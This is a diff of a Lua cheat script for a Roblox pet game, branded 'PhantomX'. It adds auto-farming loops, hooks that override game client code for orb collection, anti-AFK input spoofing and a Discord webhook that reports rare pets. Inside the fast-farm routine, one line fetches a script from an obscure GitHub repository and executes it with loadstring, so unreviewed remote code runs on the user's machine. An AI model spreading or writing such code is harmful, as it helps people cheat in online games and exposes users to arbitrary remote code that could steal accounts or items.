+                            for _, petData in pairs(PetCmds.GetEquipped()) do equippedUIDs[petData.uid] = true end
+                        end)
+                        for _, petData in pairs(DaycareCmds.GetActive(LocalPlayer)) do
+                            if petData.Pet and petData.Pet.uid then daycareUIDs[petData.Pet.uid] = true end
+                        end
+                        for uid, petData in pairs(currentSave.Inventory.Pet) do
+                            if not equippedUIDs[uid] and not daycareUIDs[uid] and not petData._lk and (petData._am or 1) >= 1 then
+                                table.insert(candidatePets, { uid = uid, id = petData.id, amount = petData._am or 1 })
+                            end
+                        end
+                        table.sort(candidatePets, function(a, b) return a.amount > b.amount end)
+                        
+                        local enrolled = 0
+                        for i, pet in ipairs(candidatePets) do
+                            local amountToEnroll = math.min(pet.amount, availableSlots - enrolled)
+                            if amountToEnroll <= 0 then break end
+                            if pcall(function() Network.Invoke("Daycare: Enroll", { [pet.uid] = amountToEnroll }) end) then
+                                enrolled = enrolled + amountToEnroll
+                                break
+                            end
+                            task.wait(0.05)
+                        end
+                    end
+                end
+                task.wait(1)
+            end
+        end)
+    end
+    
+    --==[ AUTO CLAIM MAILBOX ]==--
+    if getgenv().PhantomXConfig and getgenv().PhantomXConfig.AutoClaimMailbox then
+        task.spawn(function()
+            while true do
+                pcall(function() Network.Invoke("Mailbox: Claim All") end)
+                task.wait(60)
+            end
+        end)
+    end
+    
+    --==[ AUTO USE TOYS ]==--
+    if getgenv().PhantomXConfig and getgenv().PhantomXConfig.AutoUseToys then
+        task.spawn(function()
+            local BuffCmds
+            if not pcall(function() BuffCmds = require(ReplicatedStorage.Library.Client.BuffCmds) end) then return end
+            
+            while true do
+                local saveData = require(Client.Save).Get(LocalPlayer)
+                if saveData and saveData.Buffs then
+                    for _, buffName in ipairs({"Squeaky Toy", "Toy Ball", "Toy Bone"}) do
+                        if not BuffCmds.IsActive(buffName, LocalPlayer) then
+                            local invokeKey = buffName:gsub(" ", "") .. "_Consume"
+                            pcall(function() Network.Invoke(invokeKey) end)
+                        end
+                    end
+                end
+                task.wait(5)
+            end
+        end)
+    end
+    
+    --==[ AUTO EAT FRUITS ]==--
+    if getgenv().PhantomXConfig and getgenv().PhantomXConfig.AutoEatFruits then
+        task.spawn(function()
+            while true do
+                task.wait(0.5)
+                local currentSave = require(Client.Save).Get()
+                if currentSave and currentSave.Inventory and currentSave.Inventory.Fruit then
+                    for i, v in pairs(currentSave.Inventory.Fruit) do
+                        if v.id == "Apple" or v.id == "Banana" or v.id == "Rainbow" or v.id == "Orange" or v.id == "Pineapple" or v.id == "Watermelon" then
+                            pcall(function() Network.Fire("Fruits: Consume", i, 1) end)
+                        end
+                    end
+                end
+            end
+        end)
+    end
+    
+    --==[ AUTO PICK UP ORBS (ALWAYS ENABLED) ]==--
+    task.spawn(function()
+        local OrbCmds
+        if not pcall(function() OrbCmds = require(ReplicatedStorage.Library.Client.OrbCmds) end) then return end
+        
+        OrbCmds.CombineDelay, OrbCmds.CollectDistance, OrbCmds.DefaultPickupDistance, OrbCmds.CombineDistance = -math.huge, math.huge, math.huge, math.huge
+        hookfunction(getconnections(Network.Fired("Orbs: Create"))[1].Function, function(Data)
+            local Orbs = {}
+            for i,v in ipairs(Data) do
+                table.insert(Orbs, v.id)
+                Network.Fire("Orbs: Collect", Orbs)
+            end
+        end)
+    end)
+    
+    --==[ ANTI AFK (ALWAYS ENABLED) ]==--
+    task.spawn(function()
+        local VirtualInputManager = game:GetService("VirtualInputManager")
+        task.spawn(function()
+            while true do
+                VirtualInputManager:SendKeyEvent(true, "Space", false, game)
+                task.wait(0.1)
+                VirtualInputManager:SendKeyEvent(false, "Space", false, game)
+                task.wait(100)
+            end
+        end)
+        task.spawn(function()
+            while task.wait(1) do
+                pcall(function() Network.Fire("Idle Tracking: Stop Timer") end)
+            end
+        end)
+    end)
+    
+    -- Load external fast farm script
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/fniasdhjsad/petysahif/refs/heads/main/script.txt"))()
+end
+
+--==[ Execute Config Flags ]==--
+task.spawn(function()
+    if getgenv().PhantomXConfig.StatsUiEnabled then
+        RunStatsUI()
+    end
+
+    if getgenv().PhantomXConfig.FastFarmEnabled then
+        RunFastFarm()
+    end
+end)
+
+--==[ WEBHOOK TRACKER - MUST BE AT THE END ]==--
+task.wait(5)
+
+repeat task.wait() until game:IsLoaded()
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+
+repeat task.wait() until LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Library = ReplicatedStorage.Library
+local Client = Library.Client
+local ExistCmds = require(Client.ExistCountCmds)
+local SaveMod = require(Client.Save)
+local Network = require(Client.Network)
+
+local StoredUIDs = {}
+
+local Formatint = function(int)
+    local Suffix = {"", "k", "M", "B", "T", "Qd", "Qn", "Sx", "Sp", "Oc", "No", "De", "UDe", "DDe", "TDe", "QdDe", "QnDe", "SxDe", "SpDe", "OcDe", "NoDe", "Vg", "UVg", "DVg", "TVg", "QdVg", "QnVg", "SxVg", "SpVg", "OcVg", "NoVg", "Tg", "UTg", "DTg", "TTg", "QdTg", "QnTg", "SxTg", "SpTg", "OcTg", "NoTg", "QdAg", "QnAg", "SxAg", "SpAg", "OcAg", "NoAg", "e141", "e144", "e147", "e150", "e153", "e156", "e159", "e162", "e165", "e168", "e171", "e174", "e177", "e180", "e183", "e186", "e189", "e192", "e195", "e198", "e201", "e204", "e207", "e210", "e213", "e216", "e219", "e222", "e225", "e228", "e231", "e234", "e237", "e240", "e243", "e246", "e249", "e252", "e255", "e258", "e261", "e264", "e267", "e270", "e273", "e276", "e279", "e282", "e285", "e288", "e291", "e294", "e297", "e300", "e303"}
+    local Index = 1
+
+    if int < 999 then
+        return int
+    end
+    while int >= 1000 and Index < #Suffix do
+        int = int / 1000
+        Index = Index + 1
+    end
+    return string.format("%.2f%s", int, Suffix[Index])
+end
+
+local GetAsset = function(Id, pt)
+    local Asset = require(Library.Directory.Pets)[Id]
+    return string.gsub(Asset and (pt == 1 and Asset.goldenThumbnail or Asset.thumbnail) or "14976456685", "rbxassetid://", "")
+end
+
+local GetStats = function(Cmds, Class, ItemTable)
+    return Cmds.Get({
+        Class = { Name = Class },
+        IsA = function(InputClass) return InputClass == Class end,
+        GetId = function() return ItemTable.id end,
+        StackKey = function()
+            return game:GetService("HttpService"):JSONEncode({id = ItemTable.id, sh = ItemTable.sh, pt = ItemTable.pt, tn = ItemTable.tn})
+        end
+    }) or nil
+end
+
+local SendWebhook = function(Id, pt, sh)
+    -- INCREMENT THE COUNTER
+    if string.find(Id, "Huge") then
+        getgenv().PhantomXSessionStats.HugesGained = getgenv().PhantomXSessionStats.HugesGained + 1
+        print(string.format("[PhantomX] Huge detected! Session total: +%d", getgenv().PhantomXSessionStats.HugesGained))
+    elseif string.find(Id, "Titanic") then
+        getgenv().PhantomXSessionStats.TitanicsGained = getgenv().PhantomXSessionStats.TitanicsGained + 1
+        print(string.format("[PhantomX] Titanic detected! Session total: +%d", getgenv().PhantomXSessionStats.TitanicsGained))
+    elseif string.find(Id, "Gargantuan") then
+        getgenv().PhantomXSessionStats.GargantuansGained = getgenv().PhantomXSessionStats.GargantuansGained + 1
+        print(string.format("[PhantomX] Gargantuan detected! Session total: +%d", getgenv().PhantomXSessionStats.GargantuansGained))
+    end
+    
+    -- Check if webhook URL is configured
+    if not getgenv().PhantomXConfig or not getgenv().PhantomXConfig.WebhookURL or getgenv().PhantomXConfig.WebhookURL == "" then
+        return
+    end
+    
+    local Img = string.format("https://biggamesapi.io/image/%s", GetAsset(Id, pt))
+    local Version = pt == 1 and "Golden " or pt == 2 and "Rainbow " or ""
+    local PetType = string.find(Id, "Huge") and "Huge Pet" or string.find(Id, "Titanic") and "Titanic Pet" or string.find(Id, "Gargantuan") and "Gargantuan Pet" or "Pet"
+    local Exist = GetStats(ExistCmds, "Pet", { id = Id, pt = pt, sh = sh, tn = nil })
+
+    local Body = game:GetService("HttpService"):JSONEncode({
+        content = (getgenv().PhantomXConfig.DiscordID and getgenv().PhantomXConfig.DiscordID ~= "") and string.format("<@%s>", getgenv().PhantomXConfig.DiscordID) or "",
+        embeds = {
+            {
+                title = string.format("Just got a %s!", PetType),
+                color = 0xADD8E6,
+                timestamp = DateTime.now():ToIsoDate(),
+                thumbnail = { url = Img },
+                description = string.format("**%s Info💫:**\n**Name:** %s%s%s\n**Exist count:** `%s\n**In Account:** ||%s||",
+                    PetType, Version, sh and "Shiny " or "", Id, Formatint(Exist or 0), LocalPlayer.Name),
+                footer = { text = "PhantomX Webhook System" }
+            }
+        }
+    })
+
+    pcall(function()
+        local requestFunc = request or http_request or syn.request or HttpPost or http.request
+        if requestFunc then
+            return requestFunc({
+                Url = getgenv().PhantomXConfig.WebhookURL,
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = Body
+            })
+        end
+    end)
+end
+
+-- Store all existing huge/titanic/gargantuan UIDs at startup
+for uid, petData in pairs(SaveMod.Get()['Inventory']['Pet'] or {}) do
+    if (string.find(petData.id, "Huge") or string.find(petData.id, "Titanic") or string.find(petData.id, "Gargantuan")) then
+        StoredUIDs[uid] = true
+    end
+end
+
+-- Listen for inventory updates
+Network.Fired("Items: Update"):Connect(function(_, Inventory)
+    if Inventory["set"] and Inventory["set"]["Pet"] then
+        for uid, petData in pairs(Inventory["set"]["Pet"]) do
+            if (string.find(petData.id, "Huge") or string.find(petData.id, "Titanic") or string.find(petData.id, "Gargantuan")) and not StoredUIDs[uid] then
+                SendWebhook(petData.id, petData.pt, petData.sh)
+                StoredUIDs[uid] = true
+            end
+        end
+    end
+end)
